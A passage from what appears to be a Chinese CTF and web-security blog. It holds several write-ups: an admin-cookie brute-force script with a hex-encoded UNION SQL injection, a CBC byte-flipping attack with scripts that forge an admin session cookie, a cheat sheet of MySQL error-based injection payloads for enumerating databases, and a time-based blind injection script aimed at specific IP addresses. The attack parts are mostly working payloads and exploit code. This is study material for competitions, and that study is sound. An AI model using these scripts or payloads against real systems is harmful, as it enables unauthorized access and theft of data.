import hmac
import hashlib
import sys
import string
rand = &apos;wh&apos;    //根据需要自行更改
get_token = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;
test_cookie = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;

def get_csrf_token(res):
    rex = re.search(r&apos;\S*&lt;input type=&quot;hidden&quot; name=&quot;TOKEN&quot; id=&quot;password&quot; value=&quot;(\w*)&quot;&gt;&apos;, res.content)
    print rex.group(1)
    return rex.group(1)


def test_token(s,screat,phpsessionid):

 # _cookie=s.cookies
 # requests.utils.add_dict_to_cookiejar(_cookie,{&quot;uid&quot;:&quot;admin%7c&quot;+hash_hmac(screat)})

    s.headers[&apos;cookie&apos;]=&quot;&quot;
    s.headers[&apos;Cookie&apos;]=&quot;uid=admin%7c&quot;+hash_hmac(screat)+&quot;; &quot;+phpsessionid


    res=s.get(test_cookie)
    if res.content.find(&quot;not login&quot;)&lt;0:
        print &quot;key&quot;,screat
        print &quot;cookies&quot;,s.headers[&apos;Cookie&apos;]
        return True
    else:
        print &quot;key:&quot;,screat,&quot;failed!&quot;
        return False


def hash_hmac(data):
    hash=hashlib.md5()
    hash.update(data+&quot;admin&quot;)
    # h = hmac.new(key, data, hashlib.md5)
    return hash.hexdigest()

def rand_str(length):
    return &apos;&apos;.join(random.choice(string.letters + string.digits) for _ in range(length))

def calc_maybe(lst):
    prd = []
    for i in lst:
        prd.append((i, i+1))
    return itertools.product(*prd)


flag = True
while flag:
    rand_lst = []
    s = requests.session();
    s.headers = {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) &quot;
                      &quot;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51&quot;
                      &quot;.0.2704.63 Safari/537.36&quot;
    }


    s.headers[&apos;Cookie&apos;] = &quot;PHPSESSID={};&quot;.format(rand_str(26))
    phpsessionid=s.headers[&apos;Cookie&apos;]
    for i in range(2):
        for j in range(2):
            for k in range(2):
                for l in range(2):
                    for m in range(2):
                        for n in range(2):
                            secret = rand[i]+rand[j]+rand[k]+rand[l]+rand[m]+rand[n]
                            if test_token(s, secret, phpsessionid):
                                flag = False
                                break
                    if flag ==False:
                        break
                if flag == False:
                    break
            if flag == False:
                break
        if flag == False:
            break
    if flag == False:
        break
</code></pre><p><img src="/images/12/8.png" alt=""><br>现在我们得到了uid以及登入时验证的phpsessid,可以通过火狐插件来修改cookies，直接以admin身份登入。  </p>
<h3 id="获取我们所要的信息"><a href="#获取我们所要的信息" class="headerlink" title="获取我们所要的信息"></a>获取我们所要的信息</h3><p><img src="/images/12/9.png" alt=""><br>可以看到这里只有一个查询功能，点开。<br><img src="/images/12/10.png" alt=""><br>发现这里只有一个查询前多少条的功能。先利用LEF漏洞看看源码。<br><img src="/images/12/11.png" alt=""><br>这里有一个is_numeric()函数，我们只能输入数字，0e类型，还有十六进制。是无法输入字符串的。不过，仔细看看最初的sql文件。<br><img src="/images/12/12.png" alt=""><br>这里的num是字符串形式，也就是说，我们输入的hex值，是可以被当作字符来处理的。所以我们可以通过把我们的查询语句转为hex值然后进行查询。值得注意的是note是有四列的。<br><img src="/images/12/13.png" alt=""><br>语句如上，所以不用加’闭合，前面的条数一定要比数据库有的条数少，要不然会报错。所以查询语句为<strong>2 union select 1,flag,3,4 from flags</strong>。<br>经过处理变为<strong>0x3220756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773</strong><br>拼接起来就是<strong>select * from note limit 0,2 union select 1,flag,3,4 from flags</strong><br>接着提交就能查出flag了，如果不是题目那么我们是可以通过注入取拿shell了。</p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>这一次的流程的确是有很多很多的坑，我归纳起来也用了将近3天RCTF日常爆零，安恒又不会打，ISCC新放出的题目也不会做，太垃圾了。欸。。。。。。。。。。。。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjn3ccggy0014bkve2z0b0f0c" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-CBC字节反转攻击" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/07/CBC字节反转攻击/" class="article-date">
  <time class="post-time" datetime="2018-05-07T08:59:19.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">07</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/07/CBC字节反转攻击/">CBC字节反转攻击</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在比赛中遇到了一道挺有意思的题目，密码学和web的结合让我学到了很多不错的知识，之前也有类似的题目，例如上次的Hash长度拓展攻击，这一次的是CBC字节反转攻击，和它有着异曲同工之妙。  </p>
<h2 id="CBC加解密原理"><a href="#CBC加解密原理" class="headerlink" title="CBC加解密原理"></a>CBC加解密原理</h2><p><img src="/images/11/1.png" alt=""><br>这是CBC模式加密的流程图，这种加密模式和Hash加密是相似的，<strong>都是前一部分加密的字符用于后一部分加密</strong>，具体流程是初始生成一个IV值，然后把字符按照16字节为一个单位进行分组(不足时用特殊字符填充)和IV值进行异或处理，得到的字符串使用密钥进行加密，然后把加密后的字符作为下一步的IV值，重复操作直到所有字符串加密完成。<br><img src="/images/11/2.png" alt=""><br>解密的过程就不多说了。  </p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>异或操作(Xor)是对二进制数据进行的运算操作，是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。其运算法则为：<br>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)<br>如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。例如A=10010100，B=00100111。那么A Xor B =01001100。如果C = A Xor B ，那么A Xor B Xor C =0并且其中两个异或，都能得到第三者。</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p><img src="/images/11/3.png" alt=""><br>这是大手子原理利用的图，这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。基本的理论都讲完了，那么从题目中来理解如何利用的。<br><a href="http://118.190.152.202:8001/" target="_blank" rel="noopener">这是ISCC上的一道题目</a>，打开题目地址，有点类似注入的题目，但是f12过后发现题目给出了源码。打开index.txt发现源码。<br> 我们来理一理这些代码是如何执行的，首先是登入的代码<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[&apos;username&apos;]);</span><br><span class="line">  $password=waf((string)$_POST[&apos;password&apos;]);</span><br><span class="line">  if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果我们输入了username和password那么页面会先把username转化为字符串形式，这里是为了防止我们通过数组形式来绕过下面的<strong>username=admin</strong>，再waf过滤，这里我们的sql注入是不太可行的。如果我们输入的username为admin那么页面回显错误信息然后直接退出，不为admin那么接着调用了login()以及show_homepage()函数，如果我们通过其他方式给username赋值了，那么跳到check_login()和show_homepage()两个函数上。那我们接着来看这些函数。<br><strong>login()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function login($info)&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>show_homepage()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>整体来说就是，先把我们输入进去的username和password序列化，然后把username的值赋给$_SESSION[“username”]，如果为admin，那么输出flag，如果不为admin，则提示只有admin才能看flag。<br>如果按照上述常规的操作进行登入，那肯定是不行的，这里有一个矛盾，如果我们传入username为admin那么会提示我们<strong>You are not real admin!</strong>，但是我们不传入admin，那么就会提示我们只用admin才能看flag。所以我们需要考虑如何来绕过。所以接着看另一条路的函数<br><strong>check_login</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我们是在没有传入username和password之后所调用的，这里我们需要通过cookies传入一个iv值和一个cipher值，然后cipher经过各种解密，反序列化后把username赋给$_SESSION[‘username’]然后进行身份的验证。<br>分析了源码发现两种登入方式独立开来并没有什么可以利用的东西，但是如果我们把两种方式结合起来，在他们中间那段可进行人为操作的过程中更改数据，那么是可以做到移花接木的。  </p>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p><strong>1 传参抓包</strong><br>把username和password传参过去，注意username不能为admin。<br><img src="/images/11/4.png" alt=""><br><strong>2 更改数据</strong><br>我们这个时候得到了密文和初始的iv值，那么可以通过cbc反转字节攻击来更改我们之前的数据。那么如何利用CBC反转字节呢？<br>我们已知了加密后的文本，以及明文，那我们可以来修改原来的字符串。<br><strong>cipher</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gEc6%2BRRLjY0Bf51gQLMCB1a%2F9wD2106%2BeTzmU%2Baum9Xfin%2BlY%2FF9FfcoPd7%2Buls1Q9sOQJ4zfbnen6c5cxFLcQ%3D%3D</span><br></pre></td></tr></table></figure></p>
<p>进行处理后变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�G:�K���`@�V����N�y&lt;�S殛�ߊ�c�&#125;�(=���[5C�@�3&#125;�ޟ�9sKq</span><br></pre></td></tr></table></figure></p>
<p><strong>所对应的明文</strong><br>为了便于理解，我们直接以16字节为一块分开。这是反序列化后的明文。<br>s:2:{s:8:”userna<br>me”;s:5:”xdmin”;<br>s:8:”password”;s<br>:3:”123”;}<br>接下来就是把对应的位置进行更改。<br>假设我们更改的明文为A<br>IV值对应的是B<br>密文为C<br>如果我们构造 <strong>C Xor A Xor “我们所需的字符”</strong>，那是不是就变成了A Xor B Xor A Xor “我们所需的字符”了？这不就等于B Xor “我们所需的字符”了吗？所以我们可以直接利用这个攻击来更改我们的字符。这里直接用大手子的脚本跑把吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">iv_raw=&apos;bR1nkWOLhxJ4rKGJMBF36w%3D%3D&apos;  #这里填写第一次返回的iv值</span><br><span class="line">cipher_raw=&apos;gEc6%2BRRLjY0Bf51gQLMCB1a%2F9wD2106%2BeTzmU%2Baum9Xfin%2BlY%2FF9FfcoPd7%2Buls1Q9sOQJ4zfbnen6c5cxFLcQ%3D%3D&apos;  #这里填写第一次返回的cipher值</span><br><span class="line">print &quot;[*]原始iv和cipher&quot;</span><br><span class="line">print &quot;iv_raw:  &quot; + iv_raw</span><br><span class="line">print &quot;cipher_raw:  &quot; + cipher_raw</span><br><span class="line">print &quot;[*]对cipher解码，进行反转&quot;</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;xdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span><br><span class="line">#s:2:&#123;s:8:&quot;userna</span><br><span class="line">#me&quot;;s:5:&quot;xdmin&quot;;</span><br><span class="line">#s:8:&quot;password&quot;;s</span><br><span class="line">#:3:&quot;12345&quot;;&#125;</span><br><span class="line">xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&apos;x&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍</span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line">print &quot;反转后的cipher：&quot; + xor_cipher</span><br></pre></td></tr></table></figure></p>
<p><strong>3 传新参</strong><br>注意这个时候我们就不能把username和password传参过去了，把我们所得到的cipher值和初始的iv值给传过去。<br><img src="/images/11/5.png" alt=""><br><strong>4 修复所更改的数据块</strong><br>这个时候发现我们传的cipher无法正常反序列化，这个时候我们就需要更改iv值来使得cipher能够正常反序列化，原理和上述一致，脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">cipher = &apos;EK9/OgEKt1XNxlpRcDv8+21lIjtzOjU6IntkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&apos;#填写提交后所得的无法反序列化密文</span><br><span class="line">iv = &apos;bR1nkWOLhxJ4rKGJMBF36w%3D%3D&apos;#一开始提交的iv</span><br><span class="line">#cipher = urllib.unquote(cipher)</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = &apos;a:2:&#123;s:8:&quot;userna&apos;#被损坏前正确的明文</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(cipher[i])^ord(iv[i])) #这一步相当于把原来iv中不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure></p>
<p><strong>5 再一次传参</strong><br>把新得到的iv值传入，得到flag<br><img src="/images/11/6.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjn3ccg8l000cbkveza9p1lfs" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-sql注入之报错注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/01/sql注入之报错注入/" class="article-date">
  <time class="post-time" datetime="2018-05-01T14:50:37.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/01/sql注入之报错注入/">sql注入之报错注入</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。<br>报错注入可以主要可以分为以下几种方式:<br>floor函数报错<br>UpdateXml函数报错<br>extractvalue函数报错<br>后两种方式具有一定的局限性，报错查询的内容长度最长为32位。  </p>
<h3 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h3><p>在如何使用floor()报错注入的时候，应该先理解报错注入语句的意义。主要用到以下几个函数：<br>floor():向下取整<br>rand():生成随机数<br>count():统计结果<br>简单来说就是在查询的时候让其rand()产生不确定的数在使用order by排序时产生报错来返回信息。<br><strong><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">具体参考这篇文章</a></strong><br>我就直接给出语句：  </p>
<blockquote>
<p><strong>1 数据库</strong> and (select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>2 库名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>3 表名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=数据库名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)  –+<br><strong>4 列名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>5 字段</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,列名,0x3a,列名,0x23) FROM 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+  </p>
</blockquote>
<p>至于其他的语句自己慢慢测试，语句不限这一种，报错注入的成因并不是语句顺序的问题而是在于其逻辑。  </p>
<h3 id="Updataxml报错"><a href="#Updataxml报错" class="headerlink" title="Updataxml报错"></a>Updataxml报错</h3><p>并没有深入学习Mysql语句，所以对Updataxml()这个函数也是不太了解的，直接贴出具体的报错注入语句吧。。。  </p>
<blockquote>
<p><strong>1 数据库</strong> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) –+<br><strong>2 库名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1) –+<br><strong>3 表名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema=库名 limit 0,1),0x7e),1) –+<br><strong>4 列名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name=表名 limit 0,1),0x7e),1) –+<br><strong>5 字段</strong> and updataxml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),1) –+  </p>
</blockquote>
<h3 id="Extractvalue报错"><a href="#Extractvalue报错" class="headerlink" title="Extractvalue报错"></a>Extractvalue报错</h3><p>这个函数的原理和上个函数差不多，具体格式如下  </p>
<blockquote>
<p>and extractvalue(1, concat(0x7e, (select database()),0x7e))  –+  </p>
</blockquote>
<p>其他的和上面类似，一一对照就行了。  </p>
<h2 id="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"><a href="#sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。" class="headerlink" title="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"></a>sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjn3ccgh70019bkve41g4py69" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-sql注入之时间盲注" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/04/30/sql注入之时间盲注/" class="article-date">
  <time class="post-time" datetime="2018-04-30T08:37:07.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">30</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/30/sql注入之时间盲注/">sql注入之时间盲注</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>上一种注入方式是在虽然没有回显位，但是正确错误的页面有所不同的，那如果正确页面和错误页面都相同呢？我们这是可以使用<strong>第二种注入–延时注入</strong>来判断我们所要的信息。<br>主要用到的是<strong>sleep()函数</strong>如果前面的语句为真，那么sleep()就会调用，页面回显就会有延迟，不过缺点也很明显，如果网络不好的话，报错注入就会出现误报的情况。<br>一般我们使用</p>
<blockquote>
<p>if(,1,2)<br>case when() then else end   </p>
</blockquote>
<p>这两个条件语句来进行逻辑判断<br>下面这是一个例子<br><img src="/images/9/1.png" alt=""><br>这个网站现在什么都不显示，但是我们可以试试sleep()是否有用。<br><img src="/images/9/2.png" alt=""><br>发现响应时间过长，sleep函数起了作用，接下来我们就可以试着去爆破了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">database = &quot;&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    stime = time.time()</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when(select length(database()) = %d) then sleep(10) else sleep(0) end --+&quot; %(i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if time.time() - stime &gt; 10:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">print length</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(65,123):</span><br><span class="line">        stime = time.time()</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/time.php?id=1&apos; and case when((select ascii(substr(database(),%d,1)))= %d) then sleep(10) else sleep(0) end --+&quot;%(i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if time.time() - stime &gt; 10:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            break</span><br><span class="line">            print database</span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
<p>爆破出数据库名。接下来的几个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; and case when(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;edutest&quot; limit 0,1),1,1)) = 65) then sleep(10) else sleep(0) end --+&quot;</span><br><span class="line">........</span><br></pre></td></tr></table></figure></p>
<p>之后和上一次的脚本类似，理解一下自己就能去试试爆破出信息来了。</p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>无力感，什么都做不好，什么都比不过人家，没实力又太骄傲，我可真是个废物。浮躁浮躁，一天都不知道在干些什么，真是糟糕透了。重新学吧，起码要在大二前，拿出一点成绩。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjn3ccggo000zbkvemv47u2hb" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-sql注入之布尔型注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/04/29/sql注入之布尔型注入/" class="article-date">
  <time class="post-time" datetime="2018-04-29T04:46:32.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">29</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/29/sql注入之布尔型注入/">sql注入之布尔型注入</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
